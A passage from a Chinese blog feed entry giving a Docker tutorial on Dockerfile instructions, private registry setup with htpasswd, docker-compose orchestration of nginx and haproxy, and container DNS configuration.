定义匿名卷，容器运行时向此卷写入的数据都不会记录到容器的存储层，从而保证了这个容器的无状态化（就是容器的读写层，原则上也不要写入数据，如果要写，请将宿主机的目录挂载为卷）。<strong>VOLUME指令定义的是target目录，是容器内部的目录，source呢，是匿名的，自动生成的，在宿主机的Docker安装目录下，/var/lib/docker/volumes。</strong></li><li>EXPOSE 声明端口，仅仅是告诉你我这个进程的守护端口是什么，说明而已，方便你做端口映射有个参考。另外 docker run -P 随机端口映射，会将这个声明的端口映射出去，不然鬼知道他要映射哪个端口。</li><li>WORKDIR指定工作目录，改变以后各层的工作目录，类似shell中的cd效果（命令都写在一行才一样）。</li><li>USER指定当前用户，改变环境状态并影响以后的层。如果你是用root执行的脚本，但是需要使用某个用户来启动特定进程，用gosu，不要用su、sudo。比如 <code>CMD [ &quot;exec&quot;, &quot;gosu&quot;, &quot;redis&quot;, &quot;redis-server]</code></li><li>HEALTHCHECK 健康检查 ，HEALTHCHECK CMD <commod>  设置检查容器健康状况的命令。docker ps 里可以看到，或者 docker inspect 的Health状态。</li><li>ONSUILD 为他人做嫁衣 ，后面跟其他指令：RUN COPY等，这些指令不会立即执行，只有在以当前镜像为基础镜像制作新的镜像的时候，才会执行。类似模版吧，方便修改后统一跟新。</li><li>多阶段构建。推荐使用多阶段构建，而不是都写在一个Dokcerfile文件里，或者分散到多个Dockerfile。</li><li>镜像迁移，应该使用Docker Registry ，而不推荐 docker save 和 docker load。SSH传输例子，带进度条：    <code>docker save &lt;镜像名&gt; | bzip2 | pv | ssh &lt;用户名&gt;@&lt;主机名&gt; &#39;cat | docker load&#39;</code></li></ol><h2 id="四、私库搭建"><a href="#四、私库搭建" class="headerlink" title="四、私库搭建"></a>四、私库搭建</h2><h3 id="1、准备工作："><a href="#1、准备工作：" class="headerlink" title="1、准备工作："></a>1、准备工作：</h3><p><code>docker pull registry</code>  使用docker官方的仓库镜像来做私有仓库</p><p><code>mkdir auth</code> 建立密码文件目录</p><p><code>docker run --entrypoint htpasswd registry:2 -Bbn langxiaowei 123456 &gt; auth/htpasswd</code> 使用registry自带的apache命令htpasswd 命令生成密码文件，以供认证使用。</p><h3 id="2、启动Registry："><a href="#2、启动Registry：" class="headerlink" title="2、启动Registry："></a>2、启动Registry：</h3><pre><code class="bash">docker run -d -p 5000:5000 --restart=always --name my_registry \-v `pwd`/auth:/auth \ -e &quot;REGISTRY_AUTH=htpasswd&quot; \ -e &quot;REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm&quot; \ -e &quot;REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd&quot; \registry</code></pre><p>registry 默认使用5000端口，挂在密码文件后，设置环境变量-e来启动。</p><h3 id="3、登陆并使用："><a href="#3、登陆并使用：" class="headerlink" title="3、登陆并使用："></a>3、登陆并使用：</h3><p><code>docker login 10.0.0.157:5000</code>  输入用户名密码登陆私库</p><p><code>dcoker tag container_id 10.0.0.157:5000/user/image</code> 将本地镜像打tag(name:latest)</p><p><code>dcoker push container_id 10.0.0.157:5000/user/image</code> 上传本地镜像到私库</p><p><code>docker pull 10.0.0.157:5000/user/image</code> 从 私库拉取镜像到本地</p><p>注意：以上如果不写IP和port，默认拉取官方镜像docker.io</p><h3 id="4、报错解决："><a href="#4、报错解决：" class="headerlink" title="4、报错解决："></a>4、报错解决：</h3><p>登陆的时候，有以下提示：</p><ol><li><p><code>Error response from daemon: login attempt to http://10.0.0.157:5000/v2/ failed with status: 400 Bad Request</code> 密码文件路径错误，找不到。</p></li><li><p><code>Error response from daemon: Get https://10.0.0.157:5000/v2/: http: server gave HTTP response to HTTPS client</code></p><p>Docker自从1.3.X之后docker registry交互默认使用的是HTTPS，但是搭建私有镜像默认使用的是HTTP服务，所以与私有镜像交时出现以上错误。</p><p>解决办法：</p><p>/lib/systemd/system/docker.service中，ExecStar 后面加入 –insecure-registry  ip:5000</p><p>然后重启docker 服务：</p><pre><code class="bash">systemctl daemon-reload systemctl restart docker</code></pre></li></ol><h2 id="五、容器编排（单机）"><a href="#五、容器编排（单机）" class="headerlink" title="五、容器编排（单机）"></a>五、容器编排（单机）</h2><p>容器的编排，即容器的依赖启动，这里使用docker-compose 来完成容器的依赖启动，单机情况下。</p><h3 id="1、安装："><a href="#1、安装：" class="headerlink" title="1、安装："></a>1、安装：</h3><p>其是用python编写的，故用pip安装：</p><pre><code class="bash">apt-get install python-pippip install docker-compose</code></pre><h3 id="2、使用："><a href="#2、使用：" class="headerlink" title="2、使用："></a>2、使用：</h3><p>依赖docker-compose.yml文件，故要先编写yml文件。</p><pre><code class="bash">web1:        image: nginx        expose:                - 80web2:        image: nginx        expose:                - 80haproxy:        image: haproxy        volumes:                - /opt/haproxy.cfg:/usr/local/etc/haproxy/haproxy.cfg        links:                - web1                - web2        ports:                - &quot;7777:1080&quot;                - &quot;80:80&quot;</code></pre><p><code>dcoker-compose up</code>  启动编排好的容器</p><h2 id="六、配置容器DNS"><a href="#六、配置容器DNS" class="headerlink" title="六、配置容器DNS"></a>六、配置容器DNS</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>容器默认挂载了宿主机的三个文件<code>/etc/hosts, /etc/hostname, /etc/resolv.conf</code> 使用宿主机的DNS解析。</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>修改docker守护进程的配置文件<code>/etc/docker/daemon.json</code>，加入</p><pre><code>&quot;dns&quot;: [&quot;114.114.114.114&quot;,&quot;223.5.5.5&quot;]</code></pre><p>###方法三：</p><p>docker run 命令行加入参数 -h –dns</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、基本命令&quot;&gt;&lt;a href=&quot;#一、基本命令&quot; class=&quot;headerlink&quot; title=&quot;一、基本命令&quot;&gt;&lt;/a&gt;一、基本命令&lt;/h2&gt;&lt;p&gt;&lt;code&gt;docker pull nginx&lt;/code&gt;  下载docker镜像&lt;/p&gt;
&lt;p&gt;&lt;cod</summary>
      
    
    
    
    <category term="虚拟化" scheme="https://www.langxw.com/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Docker" scheme="https://www.langxw.com/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/Docker/"/>
    
    
    <category term="docker" scheme="https://www.langxw.com/tags/docker/"/>
    
  </entry>
  
</feed>
